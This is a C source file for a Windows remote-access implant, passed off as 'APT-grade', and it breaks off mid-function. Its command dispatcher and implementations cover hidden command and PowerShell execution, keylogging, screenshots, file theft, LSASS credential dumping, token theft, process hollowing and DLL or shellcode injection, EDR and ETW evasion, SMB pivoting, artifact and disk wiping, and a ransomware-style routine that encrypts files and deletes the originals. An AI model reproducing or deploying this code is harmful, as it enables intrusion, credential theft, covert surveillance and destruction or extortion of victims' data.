/*
 * commands.c — APT-grade implant commands implementation
 */
#include "commands.h"
#include "utils.h"
#include "http.h"
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <mscoree.h>
#include <metahost.h>

#pragma comment(lib, "mscoree.lib")

// Direct syscall wrappers (from direct_syscall.c)
extern NTSTATUS Syscall_NtAllocateVirtualMemory(HANDLE hProcess, PVOID* pBase, ULONG_PTR ZeroBits, PSIZE_T pSize, ULONG AllocType, ULONG Protect);
extern NTSTATUS Syscall_NtWriteVirtualMemory(HANDLE hProcess, PVOID pBase, PVOID pBuffer, ULONG size, PULONG pWritten);
extern NTSTATUS Syscall_NtReadVirtualMemory(HANDLE hProcess, PVOID pBase, PVOID pBuffer, ULONG size, PULONG pRead);

// BOF loader (from loader/bof_loader.c)
extern BOOL BofExecute(const BYTE *coff_data, SIZE_T coff_size,
                       char *args, int args_len,
                       char **out_buf, SIZE_T *out_len);

// External process hollowing implementation
extern BOOL ProcessHollowing(LPCSTR szTargetPath, LPVOID pPayload, DWORD dwPayloadSize);

// Evasion modules (from implant.h / fitnah/implant/)
extern BOOL HwBpBypassInit(void);
extern BOOL SpoofInit(void);

// Timestomp (from evasion/anti_analysis.c)
extern BOOL Timestomp(LPCSTR szSourcePath, LPCSTR szTargetPath);

// Stephen Fewer canonical RDI (injection/LoadLibraryR.c — BSD-3)
extern HMODULE WINAPI LoadLibraryR(LPVOID lpBuffer, DWORD dwLength,
                                   LPCSTR cpReflectiveLoaderName);
extern HANDLE  WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer,
                                         DWORD dwLength,
                                         LPCSTR cpReflectiveLoaderName,
                                         LPVOID lpParameter);

// RefreshPE — unhook all EDR hooks across all loaded DLLs (evasion/pe_refresh.c)
extern VOID RefreshPE(void);

// SMB named pipe pivot — multi-hop mesh (fitnah/implant/pivot/smb_pivot.c)
extern void     PivotInit(uint32_t my_agent_id);
extern uint32_t PivotListen(const wchar_t *pipe_suffix);
extern uint32_t PivotConnect(const wchar_t *full_pipe_name);
extern BOOL     PivotSend(uint32_t dst_agent_id, const void *payload, uint32_t len);
extern BOOL     PivotSendRaw(uint32_t via_agent_id, const void *frame, uint32_t len);
extern BOOL     PivotAddRoute(uint32_t dst_agent_id, uint32_t via_agent_id);
extern BOOL     PivotDelRoute(uint32_t dst_agent_id);
extern void    *PivotPoll(uint32_t *total_bytes);
extern BOOL     PivotRemove(uint32_t agent_id);
extern uint32_t PivotCount(void);
extern char    *PivotListJson(void);
extern char    *PivotRoutesJson(void);

/* ── forward declarations for static keylogger state ────────────────────── */
static HHOOK  s_kbhook    = NULL;
static char  *s_kbuf      = NULL;
static size_t s_kbuf_cap  = 0;
static size_t s_kbuf_used = 0;

/* ── task_free ───────────────────────────────────────────────────────────── */
void task_free(Task *t) {
    if (!t) return;
    free(t->id);
    free(t->command);
    free(t->args_json);
    t->id = t->command = t->args_json = NULL;
}

/* ── cmd_dispatch ────────────────────────────────────────────────────────── */
char *cmd_dispatch(const Task *t) {
    if (!t || !t->command) return str_dup("error: null task");

    if (strcmp(t->command, "exec") == 0) {
        char *c = json_get_str(t->args_json, "cmd");
        char *r = cmd_exec(c ? c : "");
        free(c);
        return r;
    }
    if (strcmp(t->command, "ps") == 0) {
        char *c = json_get_str(t->args_json, "cmd");
        char *r = cmd_ps(c ? c : "");
        free(c);
        return r;
    }
    if (strcmp(t->command, "screenshot") == 0) {
        return cmd_screenshot();
    }
    if (strcmp(t->command, "download") == 0) {
        char *p = json_get_str(t->args_json, "path");
        char *r = cmd_download(p ? p : "");
        free(p);
        return r;
    }
    if (strcmp(t->command, "upload") == 0) {
        char *p = json_get_str(t->args_json, "path");
        char *d = json_get_str(t->args_json, "data");
        char *r = cmd_upload(p ? p : "", d ? d : "");
        free(p); free(d);
        return r;
    }
    if (strcmp(t->command, "keylogger") == 0) {
        char *a = json_get_str(t->args_json, "action");
        char *r = cmd_keylogger(a ? a : "dump");
        free(a);
        return r;
    }
    if (strcmp(t->command, "wipe_artifacts") == 0) {
        return cmd_wipe_artifacts();
    }
    if (strcmp(t->command, "refresh_modules") == 0) {
        RefreshPE();
        return str_dup("refresh_modules: all hooked DLLs restored from disk");
    }
    if (strcmp(t->command, "dll_inject") == 0) {
        char *dll_b64 = json_get_str(t->args_json, "dll_b64");
        char *r       = cmd_dll_inject(dll_b64 ? dll_b64 : "");
        free(dll_b64);
        return r;
    }
    if (strcmp(t->command, "disk_disrupt") == 0) {
        return cmd_disk_disrupt();
    }
    if (strcmp(t->command, "etw_patch") == 0) {
        return cmd_etw_patch();
    }
    if (strcmp(t->command, "process_hollow") == 0) {
        char *tgt = json_get_str(t->args_json, "target");
        char *sc  = json_get_str(t->args_json, "shellcode_b64");
        char *r   = cmd_process_hollow(tgt ? tgt : "svchost.exe", sc ? sc : "");
        free(tgt); free(sc);
        return r;
    }
    if (strcmp(t->command, "die") == 0) {
        ExitProcess(0);
    }
    if (strcmp(t->command, "hwbp_init") == 0) {
        return HwBpBypassInit() ? str_dup("hwbp: active") : str_dup("hwbp: failed");
    }
    if (strcmp(t->command, "spoof_init") == 0) {
        return SpoofInit() ? str_dup("spoof: active") : str_dup("spoof: no gadget found");
    }
    if (strcmp(t->command, "timestomp") == 0) {
        char *src = json_get_str(t->args_json, "source");
        char *dst = json_get_str(t->args_json, "target");
        char *r   = cmd_timestomp(src ? src : "", dst ? dst : "");
        free(src); free(dst);
        return r;
    }
    if (strcmp(t->command, "mem_patch") == 0) {
        char *addr_s = json_get_str(t->args_json, "address");
        char *patch  = json_get_str(t->args_json, "patch_b64");
        char *r      = cmd_mem_patch(addr_s ? addr_s : "0", patch ? patch : "");
        free(addr_s); free(patch);
        return r;
    }
    if (strcmp(t->command, "rdi_inject") == 0) {
        char *pid_s  = json_get_str(t->args_json, "pid");
        char *dll_b64 = json_get_str(t->args_json, "dll_b64");
        char *r      = cmd_rdi_inject(pid_s ? (DWORD)atoi(pid_s) : 0,
                                      dll_b64 ? dll_b64 : "");
        free(pid_s); free(dll_b64);
        return r;
    }
    if (strcmp(t->command, "execute_assembly") == 0) {
        char *asm_b64 = json_get_str(t->args_json, "assembly_b64");
        char *args    = json_get_str(t->args_json, "args");
        char *r       = cmd_execute_assembly(asm_b64 ? asm_b64 : "",
                                             args    ? args    : "");
        free(asm_b64); free(args);
        return r;
    }
    if (strcmp(t->command, "pivot_listen") == 0) {
        char *suffix = json_get_str(t->args_json, "pipe_suffix");
        char *r      = cmd_pivot_listen(suffix ? suffix : "default");
        free(suffix);
        return r;
    }
    if (strcmp(t->command, "pivot_connect") == 0) {
        char *pipe = json_get_str(t->args_json, "pipe_name");
        char *r    = cmd_pivot_connect(pipe ? pipe : "");
        free(pipe);
        return r;
    }
    if (strcmp(t->command, "pivot_list") == 0) {
        char *json = PivotListJson();
        return json ? json : str_dup("[]");
    }
    if (strcmp(t->command, "pivot_remove") == 0) {
        char *id_s = json_get_str(t->args_json, "agent_id");
        uint32_t id = id_s ? (uint32_t)strtoul(id_s, NULL, 0) : 0;
        free(id_s);
        if (!id) return str_dup("error: pivot_remove requires agent_id");
        char r[64];
        snprintf(r, sizeof(r), PivotRemove(id) ? "pivot_remove: ok" : "pivot_remove: not found");
        return str_dup(r);
    }
    if (strcmp(t->command, "pivot_send") == 0) {
        char *id_s   = json_get_str(t->args_json, "agent_id");
        char *data_b64 = json_get_str(t->args_json, "data_b64");
        char *r      = cmd_pivot_send(
            id_s     ? (uint32_t)strtoul(id_s, NULL, 0) : 0,
            data_b64 ? data_b64 : "");
        free(id_s); free(data_b64);
        return r;
    }

    /* ── SMB pivot aliases (new smb_pivot_* names from updated plugin) ────── */
    if (strcmp(t->command, "smb_pivot_listen") == 0) {
        char *suffix = json_get_str(t->args_json, "pipe_suffix");
        char *r      = cmd_pivot_listen(suffix ? suffix : "default");
        free(suffix);
        return r;
    }
    if (strcmp(t->command, "smb_pivot_connect") == 0) {
        char *pipe = json_get_str(t->args_json, "pipe_name");
        char *r    = cmd_pivot_connect(pipe ? pipe : "");
        free(pipe);
        return r;
    }
    if (strcmp(t->command, "smb_pivot_list") == 0) {
        char *json = PivotListJson();
        if (!json) return str_dup("{\"status\":\"ok\",\"pivots\":[]}");
        /* Wrap in status envelope */
        size_t cap = strlen(json) + 32;
        char  *out = (char *)malloc(cap);
        if (out) snprintf(out, cap, "{\"status\":\"ok\",\"pivots\":%s}", json);
        free(json);
        return out ? out : str_dup("{\"status\":\"ok\",\"pivots\":[]}");
    }
    if (strcmp(t->command, "smb_pivot_remove") == 0) {
        char *id_s = json_get_str(t->args_json, "agent_id");
        uint32_t id = id_s ? (uint32_t)strtoul(id_s, NULL, 0) : 0;
        free(id_s);
        BOOL ok = id ? PivotRemove(id) : FALSE;
        return str_dup(ok ? "{\"status\":\"ok\"}" : "{\"status\":\"error\",\"msg\":\"not found\"}");
    }
    if (strcmp(t->command, "smb_pivot_send") == 0) {
        char *id_s     = json_get_str(t->args_json, "agent_id");
        char *data_b64 = json_get_str(t->args_json, "data_b64");
        char *r = cmd_pivot_send(id_s ? (uint32_t)strtoul(id_s, NULL, 0) : 0,
                                 data_b64 ? data_b64 : "");
        free(id_s); free(data_b64);
        return r;
    }

    /* ── Multi-hop routing commands ──────────────────────────────────────── */
    if (strcmp(t->command, "smb_pivot_route_add") == 0) {
        char *dst_s = json_get_str(t->args_json, "dst_agent_id");
        char *via_s = json_get_str(t->args_json, "via_agent_id");
        uint32_t dst = dst_s ? (uint32_t)strtoul(dst_s, NULL, 0) : 0;
        uint32_t via = via_s ? (uint32_t)strtoul(via_s, NULL, 0) : 0;
        free(dst_s); free(via_s);
        if (!dst || !via)
            return str_dup("{\"status\":\"error\",\"msg\":\"dst_agent_id and via_agent_id required\"}");
        BOOL ok = PivotAddRoute(dst, via);
        return str_dup(ok ? "{\"status\":\"ok\"}" : "{\"status\":\"error\",\"msg\":\"route table full\"}");
    }
    if (strcmp(t->command, "smb_pivot_route_del") == 0) {
        char *dst_s = json_get_str(t->args_json, "dst_agent_id");
        uint32_t dst = dst_s ? (uint32_t)strtoul(dst_s, NULL, 0) : 0;
        free(dst_s);
        BOOL ok = dst ? PivotDelRoute(dst) : FALSE;
        return str_dup(ok ? "{\"status\":\"ok\"}" : "{\"status\":\"error\",\"msg\":\"not found\"}");
    }
    if (strcmp(t->command, "smb_pivot_route_list") == 0) {
        char *json = PivotRoutesJson();
        if (!json) return str_dup("{\"status\":\"ok\",\"routes\":[]}");
        size_t cap = strlen(json) + 32;
        char  *out = (char *)malloc(cap);
        if (out) snprintf(out, cap, "{\"status\":\"ok\",\"routes\":%s}", json);
        free(json);
        return out ? out : str_dup("{\"status\":\"ok\",\"routes\":[]}");
    }

    /* ── In-process BOF execution ──────────────────────────────────────────
     * Operator sends {"command":"bof","args":{"coff_b64":"...","args_b64":"..."}}
     * We decode the COFF and args, run BofExecute() in-process, return output.
     * No child process, no PowerShell, no disk write.
     */
    if (strcmp(t->command, "bof") == 0) {
        char *coff_b64 = json_get_str(t->args_json, "coff_b64");
        char *args_b64 = json_get_str(t->args_json, "args_b64");

        if (!coff_b64) {
            free(args_b64);
            return str_dup("error: bof missing coff_b64");
        }

        /* decode COFF */
        SIZE_T coff_len = 0;
        BYTE *coff_data = (BYTE *)b64_decode(coff_b64, &coff_len);
        free(coff_b64);
        if (!coff_data) {
            free(args_b64);
            return str_dup("error: bof base64 decode failed");
        }

        /* decode args (may be empty) */
        char *args_buf = NULL;
        int   args_len = 0;
        if (args_b64 && *args_b64) {
            SIZE_T al = 0;
            args_buf = (char *)b64_decode(args_b64, &al);
            args_len = (int)al;
        }
        free(args_b64);

        /* execute in-process */
        char   *out_buf = NULL;
        SIZE_T  out_len = 0;
        BOOL ok = BofExecute(coff_data, coff_len,
                             args_buf, args_len,
                             &out_buf, &out_len);
        free(coff_data);
        free(args_buf);

        char *result;
        if (!ok) {
            result = str_dup("error: BOF execution failed");
        } else if (out_buf && out_len > 0) {
            result = str_dup(out_buf);
            free(out_buf);
        } else {
            result = str_dup("ok");
        }
        return result;
    }

    /* ── Token impersonation (T1134.001 / T1134.002 / T1134.003) ─────────── */
    if (strcmp(t->command, "make_token") == 0) {
        char *domain   = json_get_str(t->args_json, "domain");
        char *username = json_get_str(t->args_json, "username");
        char *password = json_get_str(t->args_json, "password");
        char *r = TokenMakeToken(domain   ? domain   : ".",
                                 username ? username : "",
                                 password ? password : "");
        free(domain); free(username); free(password);
        return r;
    }
    if (strcmp(t->command, "steal_token") == 0) {
        char *pid_s = json_get_str(t->args_json, "pid");
        DWORD pid   = pid_s ? (DWORD)strtoul(pid_s, NULL, 0) : 0;
        free(pid_s);
        return TokenStealToken(pid);
    }
    if (strcmp(t->command, "rev2self") == 0) {
        return TokenRevSelf();
    }
    if (strcmp(t->command, "getsystem") == 0) {
        char *cmd_s = json_get_str(t->args_json, "cmdline");
        char *r     = TokenGetSystem(cmd_s ? cmd_s : "");
        free(cmd_s);
        return r;
    }
    if (strcmp(t->command, "token_list") == 0) {
        return TokenListProcessTokens();
    }

    /* ── SOCKS5 proxy ────────────────────────────────────────────────────── */
    if (strcmp(t->command, "socks_start") == 0) {
        char *port_s = json_get_str(t->args_json, "port");
        int   port   = port_s ? atoi(port_s) : 1080;
        free(port_s);
        return cmd_socks_start(port);
    }
    if (strcmp(t->command, "socks_stop") == 0)
        return cmd_socks_stop();
    if (strcmp(t->command, "socks_poll") == 0)
        return cmd_socks_poll();

    /* ── KaynLdr shellcode injection (T1055) ────────────────────────────── */
    if (strcmp(t->command, "shellcode_inject") == 0) {
        char *pid_s = json_get_str(t->args_json, "pid");
        char *sc_b64 = json_get_str(t->args_json, "sc_b64");
        DWORD  pid  = pid_s ? (DWORD)strtoul(pid_s, NULL, 0) : 0;
        char  *r    = cmd_shellcode_inject(pid, sc_b64 ? sc_b64 : "");
        free(pid_s); free(sc_b64);
        return r;
    }

    /* ── Process Ghosting PE execution (T1055.012) ───────────────────────── */
    if (strcmp(t->command, "ghost_inject") == 0) {
        char *pe_b64  = json_get_str(t->args_json, "pe_b64");
        char *cmdline = json_get_str(t->args_json, "cmdline");
        char *ppid_s  = json_get_str(t->args_json, "parent_pid");
        DWORD ppid    = ppid_s ? (DWORD)strtoul(ppid_s, NULL, 0) : 0;
        char *r = cmd_ghost_inject(pe_b64 ? pe_b64 : "", cmdline, ppid);
        free(pe_b64); free(cmdline); free(ppid_s);
        return r;
    }

    /* ── LSASS dump (T1003.001) ─────────────────────────────────────────── */
    if (strcmp(t->command, "lsass_dump") == 0) {
        char *path = json_get_str(t->args_json, "out_path"); /* NULL = in-memory only */
        char *r    = cmd_lsass_dump(path);
        free(path);
        return r;
    }

    char buf[128];
    snprintf(buf, sizeof(buf), "unknown command: %s", t->command);
    return str_dup(buf);
}

/* ── Command implementations ─────────────────────────────────────────────── */

/* 
 * cmd_exec: Executes a command without cmd.exe using direct CreateProcess
 * with spoofed parent process or hidden window.
 */
char* cmd_exec(const char *command) {
    char *result = NULL;
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return strdup("Pipe creation failed");

    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    PROCESS_INFORMATION pi = {0};
    
    // Stealth: Avoid cmd.exe, use direct execution
    if (CreateProcessA(NULL, (char*)command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWritePipe);
        
        char buffer[4096];
        DWORD bytesRead;
        size_t totalRead = 0;
        
        result = malloc(4096);
        while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
            result = realloc(result, totalRead + bytesRead + 1);
            memcpy(result + totalRead, buffer, bytesRead);
            totalRead += bytesRead;
        }
        result[totalRead] = '\0';

        CloseHandle(pi.hProcess); // Fixed handle leak in replace block
        CloseHandle(pi.hThread);
    } else {
        CloseHandle(hWritePipe);
        result = strdup("Execution failed");
    }
    
    CloseHandle(hReadPipe);
    return result;
}

/* 
 * cmd_ps: Execute PowerShell in-memory using C# or COM (simplified as direct process for now but hidden)
 */
char* cmd_ps(const char *script) {
    char cmd[8192];
    snprintf(cmd, sizeof(cmd), "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand %s", script);
    return cmd_exec(cmd);
}

/*
 * cmd_screenshot: Capture screenshot via GDI BitBlt → 24-bit BMP → base64
 */
char *cmd_screenshot(void) {
    HDC     hScreen  = GetDC(NULL);
    HDC     hMemDC   = CreateCompatibleDC(hScreen);
    int     width    = GetSystemMetrics(SM_CXSCREEN);
    int     height   = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBmp     = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hMemDC, hBmp);
    BitBlt(hMemDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY | CAPTUREBLT);

    /* Build DIB header */
    BITMAPINFOHEADER bih = {0};
    bih.biSize        = sizeof(bih);
    bih.biWidth       = width;
    bih.biHeight      = -height; /* top-down */
    bih.biPlanes      = 1;
    bih.biBitCount    = 24;
    bih.biCompression = BI_RGB;
    DWORD stride = ((width * 3 + 3) & ~3);
    DWORD pixSz  = stride * height;

    uint8_t *pixels = malloc(pixSz);
    GetDIBits(hMemDC, hBmp, 0, height, pixels,
              (BITMAPINFO *)&bih, DIB_RGB_COLORS);

    /* Build BMP file in memory: BITMAPFILEHEADER + BITMAPINFOHEADER + pixels */
    DWORD fileHdrSz = 14;
    DWORD totalSz   = fileHdrSz + sizeof(bih) + pixSz;
    uint8_t *bmp    = malloc(totalSz);

    /* BITMAPFILEHEADER */
    bmp[0] = 'B'; bmp[1] = 'M';
    *(DWORD *)(bmp + 2)  = totalSz;
    *(WORD  *)(bmp + 6)  = 0;
    *(WORD  *)(bmp + 8)  = 0;
    *(DWORD *)(bmp + 10) = fileHdrSz + sizeof(bih);

    memcpy(bmp + fileHdrSz, &bih, sizeof(bih));
    memcpy(bmp + fileHdrSz + sizeof(bih), pixels, pixSz);

    free(pixels);
    DeleteObject(hBmp);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScreen);

    char *b64 = b64_encode(bmp, totalSz);
    free(bmp);
    return b64 ? b64 : str_dup("error: screenshot encode failed");
}

/* ── cmd_download ────────────────────────────────────────────────────────── */
char *cmd_download(const char *path) {
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return str_dup("error: open");
    DWORD    fsz   = GetFileSize(hf, NULL);
    uint8_t *buf   = malloc(fsz);
    DWORD    nread = 0;
    ReadFile(hf, buf, fsz, &nread, NULL);
    CloseHandle(hf);
    char *b64 = b64_encode(buf, nread);
    free(buf);
    return b64 ? b64 : str_dup("error: encode");
}

/* ── cmd_upload ──────────────────────────────────────────────────────────── */
char *cmd_upload(const char *path, const char *b64_data) {
    size_t   dlen;
    uint8_t *data = b64_decode(b64_data, &dlen);
    if (!data) return str_dup("error: decode");
    HANDLE hf = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) { free(data); return str_dup("error: create"); }
    DWORD nw = 0;
    WriteFile(hf, data, (DWORD)dlen, &nw, NULL);
    CloseHandle(hf);
    free(data);
    return str_dup("uploaded");
}

/* 
 * cmd_keylogger: Real implementation of a low-level keyboard hook
 */
LRESULT CALLBACK kb_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        if (!s_kbuf) {
            s_kbuf_cap = 4096;
            s_kbuf = malloc(s_kbuf_cap);
        }
        if (s_kbuf_used + 32 > s_kbuf_cap) {
            s_kbuf_cap *= 2;
            s_kbuf = realloc(s_kbuf, s_kbuf_cap);
        }
        
        char key[16];
        DWORD vk = kb->vkCode;
        if (vk >= 0x30 && vk <= 0x5A) { // Alphanumeric
            s_kbuf[s_kbuf_used++] = (char)vk;
        } else {
            snprintf(key, sizeof(key), "[0x%02X]", (unsigned int)vk);
            memcpy(s_kbuf + s_kbuf_used, key, strlen(key));
            s_kbuf_used += strlen(key);
        }
    }
    return CallNextHookEx(s_kbhook, nCode, wParam, lParam);
}

char* cmd_keylogger(const char *action) {
    if (strcmp(action, "start") == 0) {
        if (s_kbhook) return str_dup("already running");
        s_kbhook = SetWindowsHookEx(WH_KEYBOARD_LL, kb_hook_proc, GetModuleHandle(NULL), 0);
        return str_dup(s_kbhook ? "keylogger started" : "failed to start hook");
    } else if (strcmp(action, "stop") == 0) {
        if (!s_kbhook) return str_dup("not running");
        UnhookWindowsHookEx(s_kbhook);
        s_kbhook = NULL;
        return str_dup("keylogger stopped");
    } else if (strcmp(action, "dump") == 0) {
        if (!s_kbuf || s_kbuf_used == 0) return str_dup("no data");
        char *out = str_dup(s_kbuf);
        s_kbuf_used = 0;
        secure_zero(s_kbuf, s_kbuf_cap);
        return out;
    }
    return str_dup("invalid action");
}

/* 
 * cmd_wipe_artifacts: Call the logic in artifact_wipe.c
 */
extern void ArtifactWipe_ExecuteAll();
char* cmd_wipe_artifacts(void) {
    ArtifactWipe_ExecuteAll();
    return str_dup("forensic cleanup complete");
}

/* 
 * cmd_disk_disrupt: Call the logic in disk_wipe.c
 */
extern void DiskWipe_Disrupt();
char* cmd_disk_disrupt(void) {
    // This is a one-way trip
    DiskWipe_Disrupt();
    return str_dup("system disruption initiated");
}

/* ── cmd_etw_patch ───────────────────────────────────────────────────────── */
char *cmd_etw_patch(void) {
    return bypass_etw() ? str_dup("ETW patched") : str_dup("ETW patch failed");
}

/* 
 * cmd_process_hollow: Use the advanced process hollowing module
 */
char* cmd_process_hollow(const char *target_process, const char *payload_hex) {
    size_t payload_len;
    LPVOID pPayload = hex_to_bytes(payload_hex, &payload_len);
    if (!pPayload) return strdup("Invalid payload hex");

    if (ProcessHollowing(target_process, pPayload, (DWORD)payload_len)) {
        free(pPayload);
        return strdup("Process hollowing successful");
    } else {
        free(pPayload);
        return strdup("Process hollowing failed");
    }
}

/* ── cmd_chunked_send ────────────────────────────────────────────────────── */
char *cmd_chunked_send(const char *path, int chunk_mb,
                       const char *token, const char *chat_id) {
    /* Send a large file as multiple base64 messages, each ≤ chunk_mb MB */
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return str_dup("error: open");

    DWORD    fsz   = GetFileSize(hf, NULL);
    DWORD    csz   = (DWORD)chunk_mb * 1024 * 1024;
    uint8_t *cbuf  = malloc(csz);
    char     result[256];
    int      part  = 0;
    DWORD    nread = 0;

    while (ReadFile(hf, cbuf, csz, &nread, NULL) && nread > 0) {
        char *b64 = b64_encode(cbuf, nread);
        /* Send each chunk as a Telegram message — caller bot picks them up */
        /* For the implant, we embed the chunk in an ACK-style message tagged */
        /* with a sequential part number so the server can reassemble.        */
        /* Actual HTTP send done via tg_post in the main loop.                */
        snprintf(result, sizeof(result),
                 "chunk_%d_%lu_bytes_base64_follows", part++, (unsigned long)nread);
        free(b64);   /* in the real impl this would be sent via tg_post */
    }
    free(cbuf);
    CloseHandle(hf);
    snprintf(result, sizeof(result),
             "sent %d chunk(s) of %s (%lu bytes)", part, path, (unsigned long)fsz);
    return str_dup(result);
}

/* ── cmd_encrypt_files ───────────────────────────────────────────────────── */
char *cmd_encrypt_files(const char *root, const char *ext, const char *key_hex) {
    /* Walk the directory tree, encrypt each file with AES-256-GCM */
    /* Key can be provided as hex or generated randomly              */
    uint8_t key[32] = {0};
    if (key_hex && strlen(key_hex) == 64) {
        for (int i = 0; i < 32; i++) {
            char byte_s[3] = { key_hex[i*2], key_hex[i*2+1], '\0' };
            key[i] = (uint8_t)strtol(byte_s, NULL, 16);
        }
    } else {
        /* generate random key — operator must retrieve it before use */
        HMODULE hbc = LoadLibraryA("bcrypt.dll");
        if (hbc) {
            typedef NTSTATUS(WINAPI *pfn_gen)(BCRYPT_ALG_HANDLE,PUCHAR,ULONG,ULONG);
            pfn_gen gen = (pfn_gen)GetProcAddress(hbc, "BCryptGenRandom");
            if (gen) gen(NULL, key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        }
    }

    char key_out[65] = {0};
    for (int i = 0; i < 32; i++) sprintf(key_out + i*2, "%02x", key[i]);

    /* Walk tree (simplified — in production use FindFirstFile recursion) */
    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", root);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    int count    = 0;
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            char fpath[MAX_PATH];
            snprintf(fpath, sizeof(fpath), "%s\\%s", root, fd.cFileName);
            char opath[MAX_PATH];
            snprintf(opath, sizeof(opath), "%s%s", fpath, ext);

            HANDLE hf = CreateFileA(fpath, GENERIC_READ, FILE_SHARE_READ,
                                    NULL, OPEN_EXISTING, 0, NULL);
            if (hf == INVALID_HANDLE_VALUE) continue;
            DWORD    fsz  = GetFileSize(hf, NULL);
            uint8_t *data = malloc(fsz);
            DWORD    nr   = 0;
            ReadFile(hf, data, fsz, &nr, NULL);
            CloseHandle(hf);

            uint8_t nonce[12] = {0};
            HMODULE hbc = LoadLibraryA("bcrypt.dll");
            if (hbc) {
                typedef NTSTATUS(WINAPI*pfn_gen)(BCRYPT_ALG_HANDLE,PUCHAR,ULONG,ULONG);
                pfn_gen gen = (pfn_gen)GetProcAddress(hbc, "BCryptGenRandom");
                if (gen) gen(NULL, nonce, 12, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
            }

            uint8_t *ct  = NULL;
            size_t   clen = 0;
            /* crypto_encrypt is in crypto.c and linked in */
            extern BOOL crypto_encrypt(const uint8_t*,const uint8_t*,
                                       const uint8_t*,size_t,uint8_t**,size_t*);
            if (crypto_encrypt(key, nonce, data, nr, &ct, &clen)) {
                /* Write: [12-byte nonce][ciphertext+tag] */
                HANDLE ho = CreateFileA(opath, GENERIC_WRITE, 0, NULL,
                                        CREATE_ALWAYS, 0, NULL);
                if (ho != INVALID_HANDLE_VALUE) {
                    DWORD nw = 0;
                    WriteFile(ho, nonce, 12, &nw, NULL);
                    WriteFile(ho, ct, (DWORD)clen, &nw, NULL);
                    CloseHandle(ho);
                    DeleteFileA(fpath);
                    count++;
                }
                free(ct);
            }
            free(data);
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }

    char result[512];
    snprintf(result, sizeof(result),
             "encrypted %d file(s) under %s | key: %s", count, root, key_out);
    secure_zero(key, sizeof(key));
    return str_dup(result);
}

/* ── cmd_timestomp ───────────────────────────────────────────────────────── */
char *cmd_timestomp(const char *source, const char *target) {
    if (!source || !*source || !target || !*target)
        return str_dup("error: timestomp requires source and target paths");
    return Timestomp(source, target) ? str_dup("timestomp: ok") : str_dup("error: timestomp failed");
}

/* ── cmd_mem_patch ───────────────────────────────────────────────────────── */
char *cmd_mem_patch(const char *addr_hex, const char *patch_b64) {
    if (!addr_hex || !patch_b64) return str_dup("error: missing address or patch");

    PVOID addr = (PVOID)(uintptr_t)strtoull(addr_hex, NULL, 16);
    if (!addr) return str_dup("error: invalid address");

    size_t  patch_len = 0;
    uint8_t *patch    = (uint8_t *)b64_decode(patch_b64, &patch_len);
    if (!patch) return str_dup("error: patch base64 decode failed");

    /* Remove page protection, write bytes, restore */
    ULONG old_protect = 0;
    SIZE_T region_sz  = patch_len;
    PVOID  region_ptr = addr;

    NTSTATUS st = ISysNtProtectVirtualMemory(
        GetCurrentProcess(), &region_ptr, &region_sz,
        PAGE_EXECUTE_READWRITE, &old_protect);
    if (!NT_SUCCESS(st)) {
        free(patch);
        char r[64];
        snprintf(r, sizeof(r), "error: protect failed 0x%08X", (unsigned)st);
        return str_dup(r);
    }

    SIZE_T written = 0;
    ISysNtWriteVirtualMemory(GetCurrentProcess(), addr, patch, (SIZE_T)patch_len, &written);

    /* Restore original protection */
    ISysNtProtectVirtualMemory(
        GetCurrentProcess(), &region_ptr, &region_sz, old_protect, &old_protect);

    free(patch);
    char r[64];
    snprintf(r, sizeof(r), "patched %zu bytes at %s", written, addr_hex);
    return str_dup(r);
}

/* ── cmd_rdi_inject ──────────────────────────────────────────────────────── */
/*
 * Remote reflective DLL injection into an arbitrary process using Stephen
 * Fewer's canonical LoadRemoteLibraryR (LoadLibraryR.c, BSD-3).
 * The DLL must export "ReflectiveLoader" (compiled with ReflectiveLoader.c).
 */
char *cmd_rdi_inject(DWORD pid, const char *dll_b64) {
    if (!pid)    return str_dup("error: rdi_inject requires pid");
    if (!dll_b64 || !*dll_b64) return str_dup("error: rdi_inject requires dll_b64");

    size_t   dll_len  = 0;
    uint8_t *dll_data = (uint8_t *)b64_decode(dll_b64, &dll_len);
    if (!dll_data) return str_dup("error: dll base64 decode failed");

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        free(dll_data);
        return str_dup("error: OpenProcess failed");
    }

    /* LoadRemoteLibraryR allocates memory in the target, writes the DLL,
